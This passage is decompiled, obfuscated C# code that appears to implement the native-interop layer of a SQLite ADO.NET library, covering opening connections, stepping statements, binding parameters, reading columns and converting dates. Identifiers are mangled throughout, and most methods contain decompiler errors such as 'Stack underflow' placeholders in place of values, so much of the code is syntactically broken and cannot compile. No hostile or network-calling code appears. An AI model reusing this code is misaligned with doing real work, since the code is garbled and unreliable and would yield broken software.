				obj = global::_0011._0018._0001(global::_000E._001F._0001(this._0001), _0002 ? (-1) : 0);
			}
			if (obj != 0)
			{
				throw new SQLiteException(obj, ((global::_0011._0013)this)._0002());
			}
		}

		internal override void _0001(string _0002, string _0003)
		{
			//IL_00b7: Incompatible stack heights: 0 vs 1
			//IL_00c1: Incompatible stack heights: 0 vs 1
			//IL_00cb: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107403171);
				new ArgumentNullException((string?)/*Error near IL_00cb: Stack underflow*/);
				throw /*Error near IL_0017: Stack underflow*/;
			}
			IntPtr zero = IntPtr.Zero;
			try
			{
				byte[] array = _0087_0003._007E_0081_0007(_0082_0002._0088_0005(), _0091_0003._008F_0007(_0002, '\0'));
				byte[] array2 = null;
				if (_0003 != null)
				{
					array2 = _0087_0003._007E_0081_0007(_0082_0002._0088_0005(), _0091_0003._008F_0007(_0003, '\0'));
				}
				_0080._0017 obj = global::_0011._0018._0001(global::_000E._001F._0001(this._0001), array, array2, ref zero);
				if (obj != 0)
				{
					throw new SQLiteException(obj, global::_0011._0018._0001(zero, -1));
				}
			}
			finally
			{
				if (_0090_0002._0099_0005(zero, IntPtr.Zero))
				{
					global::_0011._0018._0001(zero);
					zero = IntPtr.Zero;
				}
			}
		}

		internal override void _0004(bool _0002)
		{
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			_0080._0017 obj = global::_0011._0018._0001(_0003: ((int)/*Error near IL_000d: Stack underflow*/ != 0) ? (-1) : 0, _0002: (IntPtr)/*Error near IL_0016: Stack underflow*/);
			if (obj != 0)
			{
				throw new SQLiteException(obj, ((global::_0011._0013)this)._0002());
			}
		}

		internal override _0080._0017 _0003()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			global::_0011._0018._0001((IntPtr)/*Error near IL_001b: Stack underflow*/);
			return (_0080._0017)/*Error near IL_000c: Stack underflow*/;
		}

		internal override _0080._0017 _0004()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			global::_0011._0018._0001((IntPtr)/*Error near IL_001b: Stack underflow*/);
			return (_0080._0017)/*Error near IL_000c: Stack underflow*/;
		}

		internal override void _0001(_0080._0017 _0002, string _0003)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_000b: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((string)/*Error near IL_0012: Stack underflow*/, (_0080._0017)/*Error near IL_0012: Stack underflow*/);
		}

		internal override void _0001(byte[] _0002)
		{
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			_0080._0017 obj = global::_0011._0018._0001(_0004: (int)_0002.LongLength, _0002: (IntPtr)/*Error near IL_0013: Stack underflow*/, _0003: (byte[])/*Error near IL_0013: Stack underflow*/);
			if (obj != 0)
			{
				throw new SQLiteException(obj, ((global::_0011._0013)this)._0002());
			}
			if (this._0001)
			{
				this._0001 = false;
			}
		}

		internal override void _0002(byte[] _0002)
		{
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			_0080._0017 obj = global::_0011._0018._0001(_0004: (_0002 != null) ? _0002.Length : 0, _0002: (IntPtr)/*Error near IL_0019: Stack underflow*/, _0003: (byte[])/*Error near IL_0019: Stack underflow*/);
			if (obj != 0)
			{
				throw new SQLiteException(obj, ((global::_0011._0013)this)._0002());
			}
			if (this._0001)
			{
				this._0001 = false;
			}
		}

		internal override void _0001(int _0002, global::_0019._001C _0003)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			global::_0011._0018._0001(_0004: _0003, _0005: IntPtr.Zero, _0002: (IntPtr)/*Error near IL_0016: Stack underflow*/, _0003: (int)/*Error near IL_0016: Stack underflow*/);
		}

		internal override void _0001(global::_0019._001D _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			global::_0011._0018._0001(_0004: IntPtr.Zero, _0002: (IntPtr)/*Error near IL_0015: Stack underflow*/, _0003: (global::_0019._001D)/*Error near IL_0015: Stack underflow*/);
		}

		internal override void _0001(global::_0018._001B _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			global::_0011._0018._0001(_0004: IntPtr.Zero, _0002: (IntPtr)/*Error near IL_0015: Stack underflow*/, _0003: (global::_0018._001B)/*Error near IL_0015: Stack underflow*/);
		}

		internal override void _0001(global::_0017._0081 _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			global::_0011._0018._0001(_0004: IntPtr.Zero, _0002: (IntPtr)/*Error near IL_0015: Stack underflow*/, _0003: (global::_0017._0081)/*Error near IL_0015: Stack underflow*/);
		}

		internal override void _0001(global::_0010._001D _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			global::_0011._0018._0001(_0004: IntPtr.Zero, _0002: (IntPtr)/*Error near IL_0015: Stack underflow*/, _0003: (global::_0010._001D)/*Error near IL_0015: Stack underflow*/);
		}

		internal override void _0001(global::_0010._001E _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			global::_0011._0018._0001(_0004: IntPtr.Zero, _0002: (IntPtr)/*Error near IL_0015: Stack underflow*/, _0003: (global::_0010._001E)/*Error near IL_0015: Stack underflow*/);
		}

		internal override _0080._0017 _0001(global::_0015._0015 _0002)
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = 16;
			global::_0011._0018._0001(_0004: IntPtr.Zero, _0002: (global::_0016._001B)/*Error near IL_0017: Stack underflow*/, _0003: (global::_0015._0015)/*Error near IL_0017: Stack underflow*/);
			return (_0080._0017)/*Error near IL_000d: Stack underflow*/;
		}

		internal override global::_0018._001A _0001(global::_0017._0080 _0002, string _0003, string _0004)
		{
			//IL_016f: Incompatible stack heights: 0 vs 1
			//IL_0179: Incompatible stack heights: 0 vs 1
			//IL_0183: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107403190);
				new ArgumentNullException((string?)/*Error near IL_0183: Stack underflow*/);
				throw /*Error near IL_0017: Stack underflow*/;
			}
			if (_0003 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107403145));
			}
			if (_0004 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107403164));
			}
			if (!(_0002._0001 is _0019 obj))
			{
				throw new ArgumentException(_0080._0014._0001(107403115), _0080._0014._0001(107403190));
			}
			global::_000E._001F obj2 = obj._0001;
			if (obj2 == null)
			{
				throw new ArgumentException(_0080._0014._0001(107403094), _0080._0014._0001(107403190));
			}
			global::_000E._001F obj3 = this._0001;
			if (obj3 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107403033));
			}
			byte[] array = global::_0011._0018._0001(_0003);
			byte[] array2 = global::_0011._0018._0001(_0004);
			global::_0015._0017 obj4 = null;
			try
			{
			}
			finally
			{
				IntPtr intPtr = global::_0011._0018._0001(global::_000E._001F._0001(obj2), array, global::_000E._001F._0001(obj3), array2);
				if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
				{
					_0080._0017 obj5 = ((global::_0011._0013)this)._0003();
					if (obj5 != 0)
					{
						throw new SQLiteException(obj5, ((global::_0011._0013)this)._0002());
					}
					throw new SQLiteException(_0080._0014._0001(107402432));
				}
				obj4 = new global::_0015._0017(obj2, intPtr);
			}
			global::_0017._0080._0001(null, new _001A(global::_000E._001D._0010, null, null, null, null, obj4, null, new object[4]
			{
				_0091._0080_0004(typeof(_0019).TypeHandle),
				_0002,
				_0003,
				_0004
			}));
			return new global::_0018._001A(this, obj4, global::_000E._001F._0001(obj2), array, global::_000E._001F._0001(obj3), array2);
		}

		internal unsafe override bool _0001(global::_0018._001A _0002, int _0003, ref bool _0004)
		{
			//IL_009c: Incompatible stack heights: 0 vs 1
			//IL_00a2: Incompatible stack heights: 0 vs 1
			//IL_00ac: Incompatible stack heights: 0 vs 1
			*(sbyte*)(nint)/*Error near IL_0007: Stack underflow*/ = 0;
			if ((int)/*Error near IL_000e: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107402427);
				throw new ArgumentNullException((string?)/*Error near IL_001d: Stack underflow*/);
			}
			global::_0015._0017 obj = _0002._0001;
			if (obj == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107402418));
			}
			IntPtr intPtr = global::_0015._0017._0001(obj);
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				throw new InvalidOperationException(_0080._0014._0001(107402337));
			}
			_0080._0017 obj2 = (_0002._0001 = global::_0011._0018._0001(intPtr, _0003));
			switch (obj2)
			{
			case _0080._0017._0002:
				return true;
			case _0080._0017._0007:
				_0004 = true;
				return true;
			case _0080._0017._0008:
				_0004 = true;
				return true;
			case _0080._0017._0084:
				return false;
			default:
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override int _0001(global::_0018._001A _0002)
		{
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107402427);
				new ArgumentNullException((string?)/*Error near IL_0067: Stack underflow*/);
				throw /*Error near IL_000e: Stack underflow*/;
			}
			global::_0015._0017 obj = _0002._0001;
			if (obj == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107402418));
			}
			IntPtr intPtr = global::_0015._0017._0001(obj);
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				throw new InvalidOperationException(_0080._0014._0001(107402337));
			}
			return global::_0011._0018._0001(intPtr);
		}

		internal override int _0002(global::_0018._001A _0002)
		{
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107402427);
				new ArgumentNullException((string?)/*Error near IL_0067: Stack underflow*/);
				throw /*Error near IL_000e: Stack underflow*/;
			}
			global::_0015._0017 obj = _0002._0001;
			if (obj == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107402418));
			}
			IntPtr intPtr = global::_0015._0017._0001(obj);
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				throw new InvalidOperationException(_0080._0014._0001(107402337));
			}
			return global::_0011._0018._0001(intPtr);
		}

		internal override void _0001(global::_0018._001A _0002)
		{
			//IL_0087: Incompatible stack heights: 0 vs 1
			//IL_0091: Incompatible stack heights: 0 vs 1
			//IL_009b: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107402427);
				new ArgumentNullException((string?)/*Error near IL_009b: Stack underflow*/);
				throw /*Error near IL_0017: Stack underflow*/;
			}
			global::_0015._0017 obj = _0002._0001;
			if (obj == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107402418));
			}
			IntPtr intPtr = global::_0015._0017._0001(obj);
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				throw new InvalidOperationException(_0080._0014._0001(107402337));
			}
			_0080._0017 obj2 = global::_0011._0018._0001(intPtr);
			global::_0008._007E_0008_0002(obj);
			if (obj2 != 0 && obj2 != _0002._0001)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override bool _0004()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001();
			return (byte)/*Error near IL_0003: Stack underflow*/ != 0;
		}

		internal override object _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, _001F._0018 _0005)
		{
			//IL_0017: Invalid comparison between Unknown and I4
			//IL_0272: Incompatible stack heights: 0 vs 1
			//IL_027e: Incompatible stack heights: 0 vs 1
			global::_0014._0017 num = ((_001F._0018)/*Error near IL_000a: Stack underflow*/)._0001;
			global::_0014._0017 obj = default(global::_0014._0017);
			if (0 == 0)
			{
				obj = num;
			}
			if ((int)/*Error near IL_0019: Stack underflow*/ == 5)
			{
				return DBNull.Value;
			}
			Type type = null;
			if (_0005._0001 != DbType.Object)
			{
				type = global::_0011._0018._0001(_0005);
				obj = global::_0011._0018._0001(type);
			}
			if ((_0003 & SQLiteConnectionFlags.GetAllAsText) == SQLiteConnectionFlags.GetAllAsText)
			{
				return this._0005(_0002, _0004);
			}
			switch (obj)
			{
			case global::_0014._0017._0005:
			{
				if (_0005._0001 == DbType.Guid && _0005._0001 == global::_0014._0017._0004)
				{
					return new Guid(this._0005(_0002, _0004));
				}
				int num2 = (int)_0001(_0002, _0004, 0, (byte[])null, 0, 0);
				byte[] array = new byte[num2];
				_0001(_0002, _0004, 0, array, 0, num2);
				if (_0005._0001 == DbType.Guid && num2 == 16)
				{
					return new Guid(array);
				}
				return array;
			}
			case global::_0014._0017._0007:
				return ((global::_0011._0013)this)._0001(_0002, _0004);
			case global::_0014._0017._0003:
				if ((object)type == null)
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				return _0005_0004._000F_0008(((global::_0011._0013)this)._0001(_0002, _0004), type, null);
			case global::_0014._0017._0002:
				if ((object)type == null)
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				if ((object)type == _0091._0080_0004(typeof(bool).TypeHandle))
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				if ((object)type == _0091._0080_0004(typeof(sbyte).TypeHandle))
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				if ((object)type == _0091._0080_0004(typeof(byte).TypeHandle))
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				if ((object)type == _0091._0080_0004(typeof(short).TypeHandle))
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				if ((object)type == _0091._0080_0004(typeof(ushort).TypeHandle))
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				if ((object)type == _0091._0080_0004(typeof(int).TypeHandle))
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				if ((object)type == _0091._0080_0004(typeof(uint).TypeHandle))
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				if ((object)type == _0091._0080_0004(typeof(long).TypeHandle))
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				if ((object)type == _0091._0080_0004(typeof(ulong).TypeHandle))
				{
					return ((global::_0011._0013)this)._0001(_0002, _0004);
				}
				return _0005_0004._000F_0008(((global::_0011._0013)this)._0001(_0002, _0004), type, null);
			default:
				return this._0005(_0002, _0004);
			}
		}

		internal override int _0001(global::_0013._0017 _0002, int _0003, int _0004)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001);
			return global::_0011._0018._0001((IntPtr)/*Error near IL_0011: Stack underflow*/, (int)/*Error near IL_0011: Stack underflow*/, _0004);
		}

		internal override long _0002(global::_0013._0017 _0002, int _0003)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			long result = 0L;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000b: Stack underflow*/)._0001);
			if (global::_0011._0018._0001((IntPtr)/*Error near IL_0015: Stack underflow*/, _0003, ref result) == _0080._0017._0002)
			{
				return result;
			}
			return 0L;
		}

		internal override void _0001(string _0002, string _0003, string _0004, ref int _0005, ref int _0006, ref string _0007)
		{
			//IL_0053: Incompatible stack heights: 0 vs 1
			IntPtr zero = IntPtr.Zero;
			int num = 0;
			_0080._0017 obj = global::_0011._0018._0001(global::_000E._001F._0001(((_0019)/*Error near IL_0011: Stack underflow*/)._0001), global::_0011._0018._0001(_0002), global::_0011._0018._0001(_0003), global::_0011._0018._0001(_0004), ref _0005, ref _0006, ref zero, ref num);
			if (obj != 0)
			{
				throw new SQLiteException(obj, null);
			}
			_0007 = global::_0011._0018._0001(zero, num);
		}

		internal override _0080._0017 _0001(string _0002, int _0003, IntPtr _0004)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			return global::_0011._0018._0001(_0003: ((int)/*Error near IL_000d: Stack underflow*/ != 0) ? global::_0011._0018._0001(_0002) : null, _0002: (IntPtr)/*Error near IL_001d: Stack underflow*/, _0004: _0003, _0005: _0004);
		}

		static _0019()
		{
			//IL_00e4: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_00ea: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0019._0001 = new object();
			_0019._0002 = null;
			_0019.m__0003 = null;
			_0019._0004 = null;
		}
	}
}
namespace _0016
{
	internal sealed class _001A : global::_0002._0019
	{
		internal new bool _0001;

		internal _001A(SQLiteDateFormats _0081_0013_0006, DateTimeKind _0019_0087, string _0082_0013_0006, IntPtr _0091_0016_0006, string _0089_0015, bool _000F_0017_0006)
			: base(_0081_0013_0006, _0019_0087, _0082_0013_0006, _0091_0016_0006, _0089_0015, _000F_0017_0006)
		{
		}

		protected override void _0001(bool _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((_001A)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			finally
			{
				base._0001(_0002);
				this._0001 = true;
			}
		}

		public override string _0001(IntPtr _0002, int _0003)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_0015: Stack underflow*/);
			return global::_0011._0018._0001((IntPtr)/*Error near IL_000c: Stack underflow*/, _0003);
		}

		internal override void _0001(string _0002, string _0003, SQLiteConnectionFlags _0004, global::_0004._0015 _0005, int _0006, bool _0007)
		{
			//IL_02a9: Incompatible stack heights: 0 vs 1
			//IL_02af: Incompatible stack heights: 0 vs 1
			if (((global::_0002._0019)/*Error near IL_000a: Stack underflow*/)._0001 != null)
			{
				((global::_0011._0013)/*Error near IL_02b9: Stack underflow*/)._0002(_0002: true);
			}
			if (base._0001 != null)
			{
				throw new SQLiteException(_0080._0014._0001(107403358));
			}
			base._0001 = _0007;
			base._0003 = _0002;
			base._0001 = _0004;
			if (_0007)
			{
				base._0001 = global::_0011._0018._0001(_0006, _0002, out base._0001);
				global::_0017._0080._0001(null, new global::_0002._001A(global::_000E._001D._0016, null, null, null, null, base._0001, _0002, new object[8]
				{
					_0091._0080_0004(typeof(_001A).TypeHandle),
					_0002,
					_0003,
					_0004,
					_0005,
					_0006,
					_0007,
					base._0001
				}));
			}
			if (base._0001 == null)
			{
				try
				{
				}
				finally
				{
					IntPtr zero = IntPtr.Zero;
					int num = (((_0004 & SQLiteConnectionFlags.NoExtensionFunctions) != SQLiteConnectionFlags.NoExtensionFunctions) ? 1 : 0);
					_0080._0017 obj;
					if (_0003 != null || num != 0)
					{
						obj = global::_0011._0018._0001(global::_0011._0018._0001(_0002), global::_0011._0018._0001(_0003), _0005, num, ref zero);
					}
					else
					{
						if ((_0005 & global::_0004._0015._0004) != global::_0004._0015._0004 && !global::_001C._0097_0003(_0002))
						{
							throw new SQLiteException(_0080._0017._0015, _0002);
						}
						if (_0003 != null)
						{
							throw new SQLiteException(_0080._0017._0015, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107402276), new object[1] { _0003 }));
						}
						obj = global::_0011._0018._0001(_0002, ref zero);
					}
					if (obj != 0)
					{
						throw new SQLiteException(obj, null);
					}
					base._0001 = new global::_000E._001F(zero, _000F_0017_0006: true);
				}
				global::_000E._001F obj2;
				_0091_0002._009C_0005(obj2 = base._0001);
				try
				{
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
				global::_0017._0080._0001(null, new global::_0002._001A(global::_000E._001D._0010, null, null, null, null, base._0001, _0002, new object[7]
				{
					_0091._0080_0004(typeof(_001A).TypeHandle),
					_0002,
					_0003,
					_0004,
					_0005,
					_0006,
					_0007
				}));
			}
			if ((_0004 & SQLiteConnectionFlags.NoBindFunctions) != SQLiteConnectionFlags.NoBindFunctions)
			{
				if (base._0001 == null)
				{
					base._0001 = new Dictionary<global::_0019._007F, global::_0012._0014>();
				}
				IEnumerator<KeyValuePair<global::_0019._007F, global::_0012._0014>> enumerator = global::_0011._0018._0001((global::_0011._0013)this, _0004).GetEnumerator();
				try
				{
					while (global::_001B._007E_0086_0003(enumerator))
					{
						KeyValuePair<global::_0019._007F, global::_0012._0014> current = enumerator.Current;
						base._0001[current.Key] = current.Value;
					}
				}
				finally
				{
					if (enumerator != null)
					{
						global::_0008._007E_0098(enumerator);
					}
				}
			}
			_0001(0);
			_0091_0002._009E_0005(base._0001);
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, DateTime _0005)
		{
			//IL_005f: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			SQLiteDateFormats sQLiteDateFormats = ((global::_0001._001A)/*Error near IL_0007: Stack underflow*/)._0001;
			switch (/*Error near IL_0020: Stack underflow*/)
			{
			case 0L:
			case 2L:
			case 3L:
				base._0001(_0002, _0003, _0004, _0005);
				return;
			}
			if ((_0003 & SQLiteConnectionFlags.LogBind) == SQLiteConnectionFlags.LogBind)
			{
				global::_0001._001F obj = _0002?._0001;
				global::_0011._0018._0001(_0005, _0004, obj);
			}
			_0001(_0002, _0003, _0004, global::_0011._0018._0001((global::_0001._001A)this, _0005));
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, string _0005)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I8
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((long)(/*Error near IL_000e: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(_0004, _0005, obj);
			}
			_0080._0017 obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, _0005, global::_001A._007E_0016_0003(_0005) * 2, _0099._008E_0004(-1));
			if (obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override DateTime _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0069: Incompatible stack heights: 0 vs 1
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_006f: Incompatible stack heights: 0 vs 1
			if (((global::_0001._001A)/*Error near IL_0007: Stack underflow*/)._0001 == SQLiteDateFormats.Ticks)
			{
				return new DateTime(((global::_0011._0013)/*Error near IL_0013: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_0013: Stack underflow*/, _0003), ((global::_0001._001A)this)._0001);
			}
			if (((global::_0001._001A)this)._0001 == SQLiteDateFormats.JulianDay)
			{
				return global::_0011._0018._0001(((global::_0011._0013)this)._0001(_0002, _0003), ((global::_0001._001A)this)._0001);
			}
			if (((global::_0001._001A)this)._0001 == SQLiteDateFormats.UnixEpoch)
			{
				return global::_0011._0018._0001(((global::_0011._0013)this)._0001(_0002, _0003), ((global::_0001._001A)this)._0001);
			}
			return global::_0011._0018._0001((global::_0001._001A)this, _0005(_0002, _0003));
		}

		internal override string _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			IntPtr intPtr = global::_0011._0018._0001((IntPtr)/*Error near IL_0014: Stack underflow*/, _0003, ref num);
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				throw new SQLiteException(_0080._0017._000E, ((global::_0011._0013)this)._0002());
			}
			return global::_0011._0018._0001(intPtr, num);
		}

		internal override string _0005(global::_0013._0017 _0002, int _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			return global::_0011._0018._0001(global::_0011._0018._0001((IntPtr)/*Error near IL_0014: Stack underflow*/, _0003, ref num), num);
		}

		internal override string _0002(global::_0013._0017 _0002, int _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			return global::_0011._0018._0001(global::_0011._0018._0001((IntPtr)/*Error near IL_0014: Stack underflow*/, _0003, ref num), num);
		}

		internal override string _0003(global::_0013._0017 _0002, int _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			return global::_0011._0018._0001(global::_0011._0018._0001((IntPtr)/*Error near IL_0014: Stack underflow*/, _0003, ref num), num);
		}

		internal override string _0004(global::_0013._0017 _0002, int _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			return global::_0011._0018._0001(global::_0011._0018._0001((IntPtr)/*Error near IL_0014: Stack underflow*/, _0003, ref num), num);
		}

		internal override string _0001(IntPtr _0002)
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0011._0018._0001((IntPtr)/*Error near IL_001b: Stack underflow*/, ref num);
			return global::_0011._0018._0001(_0003: num, _0002: (IntPtr)/*Error near IL_000f: Stack underflow*/);
		}

		internal override void _0001(IntPtr _0002, string _0003)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 2
			_ = global::_001A._007E_0016_0003;
			global::_0011._0018._0001(_0004: /*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/) * 2, _0002: (IntPtr)/*Error near IL_0017: Stack underflow*/, _0003: (string)/*Error near IL_0017: Stack underflow*/);
		}

		internal override void _0002(IntPtr _0002, string _0003)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			_ = global::_001A._007E_0016_0003;
			global::_0011._0018._0001(_0004: /*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/) * 2, _0005: _0099._008E_0004(-1), _0002: (IntPtr)/*Error near IL_0022: Stack underflow*/, _0003: (string)/*Error near IL_0022: Stack underflow*/);
		}
	}
}
namespace _0018
{
	internal sealed class _001A : IDisposable
	{
		internal global::_0011._0013 _0001;

